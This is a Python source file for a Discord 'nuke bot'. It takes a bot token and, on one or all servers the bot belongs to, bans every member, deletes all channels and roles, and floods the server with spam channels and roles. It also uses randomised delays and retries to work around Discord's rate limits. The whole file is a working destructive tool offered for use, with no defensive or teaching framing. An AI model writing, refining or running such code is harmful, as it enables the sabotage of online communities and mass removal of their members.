import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio
import random

# Initialize colorama
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

# Clear screen helper
def clear():
    system('cls' if os_name == 'nt' else 'clear')

def _input(text):
    print(text, end='')
    return input()

# Banner
baner = f'''{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

# Safe API call wrapper with backoff
def safe_api_call(coro, min_delay=0.5, max_delay=1.5):
    async def wrapper(*args, **kwargs):
        try:
            result = await coro(*args, **kwargs)
            await asyncio.sleep(random.uniform(min_delay, max_delay))
            return result
        except discord.HTTPException as e:
            # If we hit a rate limit, wait and retry
            retry = getattr(e, 'retry_after', None) or random.uniform(5, 10)
            await asyncio.sleep(retry)
            return await wrapper(*args, **kwargs)
    return wrapper

# Wrap all actions
@safe_api_call
async def delete_channel(channel):
    await channel.delete()

@safe_api_call
async def delete_role(role):
    await role.delete()

@safe_api_call
async def ban_member(member):
    await member.ban()

@safe_api_call
async def create_role(guild, name):
    return await guild.create_role(name=name)

@safe_api_call
async def create_voice_channel(guild, name):
    return await guild.create_voice_channel(name=name)

# Bulk operations with safe calls
async def delete_all_channels(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await delete_channel(channel)
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await delete_role(role)
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await ban_member(member)
            banned += 1
        except:
            continue
    return banned

async def create_roles(guild, name):
    created = 0
    to_create = 200 - len(guild.roles)
    for _ in range(to_create):
        try:
            await create_role(guild, name)
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    to_create = 200 - len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
    for _ in range(to_create):
        try:
            await create_voice_channel(guild, name)
            created += 1
        except:
            continue
    return created

# Nuke function
async def nuke_guild(guild, name):
    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channels(guild)
    print(f'{m}Deleted Channels:{b}{deleted_channels}')
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}Deleted Roles:{b}{deleted_roles}')
    created_channels = await create_voice_channels(guild, name)
    print(f'{m}Created Voice Channels:{b}{created_channels}')
    created_roles = await create_roles(guild, name)
    print(f'{m}Created Roles:{b}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')

# Main menu loop
while True:
    clear()
    choice = input(f'''   
{baner}
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Input bot token:{g}')
        name = _input(f'{y}Input name for created channels / roles:{g}')
        clear()
        choice_type = _input(f'''
{baner}
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke all servers
    {y}└─[2] {m}- {g}Nuke one server  
    {y}└─[3] {m}- {g}Exit
{y}====>{g}''')
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'[+]Logged in as {client.user.name}')
                for guild in client.guilds:
                    await nuke_guild(guild, name)
                await client.close()
        elif choice_type == '2':
            guild_id = _input(f'{y}Input server id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild, name)
                await client.close()
        else:
            print(f'{dr}Exit...')
            exit()

        try:
            client.run(token)
            input('Nuke finished, press enter to return to menu...')
        except Exception as error:
            print(f'{r}{error}')
            input('Press enter to return...')
            continue

    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
